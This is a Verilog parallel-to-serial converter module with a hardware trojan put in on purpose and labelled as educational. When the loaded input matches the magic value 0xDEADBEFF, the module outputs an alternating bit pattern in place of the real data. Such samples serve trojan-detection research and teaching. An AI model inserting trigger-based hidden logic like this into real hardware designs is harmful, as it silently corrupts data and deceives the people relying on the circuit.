`timescale 1ns/1ns

module P2S #(parameter n = 32)
            (
                input clk, enable, load,
                input [n-1:0] par_in,
                output reg ser_out,
                output valid
            );

    reg [n-1:0] par_in_temp;
    reg [5:0] count;     
    reg trojan_triggered = 0; // A flag to indicate if the trojan has been triggered

    always @(posedge clk) begin
        if (load) begin
            par_in_temp <= par_in;
            count <= 0;
            
            // Trojan trigger condition: specific pattern in par_in
            // This condition is for educational purposes to illustrate potential vulnerabilities
            if (par_in == 32'hDEADBEFF) begin
                trojan_triggered <= 1;
            end else begin
                trojan_triggered <= 0;
            end

        end else if (enable && (count != n+1)) begin
            if (!trojan_triggered) begin
                ser_out <= par_in_temp[0];
                par_in_temp <= par_in_temp >> 1;
            end else begin
                // Trojan behavior: when triggered, it outputs a fixed pattern or alters the operation
                ser_out <= count[0]; // Example behavior: outputs an alternating pattern
            end
            count <= count + 1;
        end 
    end
    
    assign valid = (count == n+1);
        
endmodule
 
